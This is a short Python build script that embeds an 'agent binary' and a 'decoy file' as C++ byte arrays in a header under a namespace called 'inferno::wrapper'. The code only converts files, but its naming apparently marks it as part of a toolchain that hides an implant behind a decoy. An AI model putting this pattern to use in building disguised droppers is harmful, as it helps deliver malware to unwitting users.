#!/usr/bin/env python3
"""Convert two binary files to a C header with AGENT_BINARY and DECOY_DATA arrays.

Usage: bin2header.py <agent_binary> <decoy_file> <output_header>
"""

import sys

def _write_array(f, name, data):
    f.write(f'const unsigned char {name}[] = {{\n')
    for i, b in enumerate(data):
        f.write(f'0x{b:02x},')
        if (i + 1) % 16 == 0:
            f.write('\n')
    f.write('\n};\n')
    f.write(f'const size_t {name}_SIZE = {len(data)};\n')

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <agent_binary> <decoy_file> <output_header>", file=sys.stderr)
        sys.exit(1)

    agent_path, decoy_path, out_path = sys.argv[1], sys.argv[2], sys.argv[3]

    with open(agent_path, 'rb') as f:
        agent_data = f.read()
    with open(decoy_path, 'rb') as f:
        decoy_data = f.read()

    with open(out_path, 'w') as f:
        f.write('#pragma once\n')
        f.write('#include <cstddef>\n')
        f.write('namespace inferno { namespace wrapper {\n')
        _write_array(f, 'AGENT_BINARY', agent_data)
        f.write('\n')
        _write_array(f, 'DECOY_DATA', decoy_data)
        f.write('} }\n')

if __name__ == '__main__':
    main()
